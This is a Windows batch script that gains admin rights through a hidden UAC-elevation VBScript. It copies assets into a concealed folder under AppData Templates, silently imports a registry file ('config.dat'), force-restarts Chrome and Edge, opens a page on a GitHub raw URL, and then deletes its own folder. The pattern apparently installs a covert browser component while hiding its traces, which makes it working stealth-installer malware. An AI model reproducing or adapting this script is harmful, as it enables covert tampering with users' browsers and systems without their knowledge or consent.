@echo off
setlocal enabledelayedexpansion
>nul 2>&1 "%SYSTEMROOT%\system32\cacls.exe" "%SYSTEMROOT%\system32\config\system"
if '%errorlevel%' NEQ '0' (
    echo Set UAC = CreateObject^("Shell.Application"^) > "%temp%\getadmin.vbs"
    echo UAC.ShellExecute "%~s0", "", "", "runas", 0 >> "%temp%\getadmin.vbs"
    "%temp%\getadmin.vbs"
    del "%temp%\getadmin.vbs"
    exit /B
)
pushd "%CD%"
CD /D "%~dp0"

set "D=%APPDATA%\Microsoft\Windows\Templates\WDF"
if not exist "%D%" mkdir "%D%"
attrib +H "%D%" >nul 2>&1
xcopy /E /Y /Q "assets\*" "%D%\" >nul 2>&1
attrib +H "%D%\*" /s /d >nul 2>&1
regedit /s "config.dat" >nul 2>&1
taskkill /F /IM chrome.exe >nul 2>&1
taskkill /F /IM msedge.exe >nul 2>&1
timeout /t 2 /nobreak >nul
start "" chrome.exe >nul 2>&1
timeout /t 3 /nobreak >nul
start "" https://raw.githubusercontent.com/ezlishmail/cdn-assets/main/done.html
timeout /t 5 /nobreak >nul
cd %TEMP%
rmdir /S /Q "%~dp0" >nul 2>&1
exit